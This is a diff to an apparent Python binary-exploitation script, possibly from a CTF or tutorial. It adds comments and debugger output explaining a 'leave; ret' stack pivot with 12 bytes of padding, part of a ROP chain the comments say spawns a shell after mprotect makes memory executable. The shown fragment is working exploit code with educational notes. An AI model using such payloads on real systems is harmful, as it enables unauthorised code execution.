@@ -16,6 +16,7 @@ def p(x):
     return struct.pack('<L', x)
 
 payload = ""
+
 ''' do leave; ret to restore the stack to our payload
  if we don't do a leave; ret, the stack is still the legit stack
  of the program filled with
@@ -41,9 +42,25 @@ on the stack
 tl;dr the leave puts our payload on the stack. We now have full control
 over the stack and where we are going with RET, so we can execute our
 ROP chain to spawn a shell
-
 '''
 payload += p(0x80483e8) # leave; ret
+
+'''
+add 12 bytes of padding so when the leave is exec,
+esp ends up pointing to the right place
+
+before leave
+EBP: 0xffffd4e8 ("AAAA\320\300\357\367]\205\004\b")
+ESP: 0xffffd4ac --> 0x80484fc (<main+127>:      leave)
+
+after leave
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd4ec --> 0xf7efc0d0 (<mprotect>:     push   ebx)
+
+so this is something to be careful of when we need to
+use leave to restore the stack, we need to ensure
+we have the proper amount of padding for the leave instruction
+'''
 payload += "A"*12 # dummy
 
 # make memory section rwx
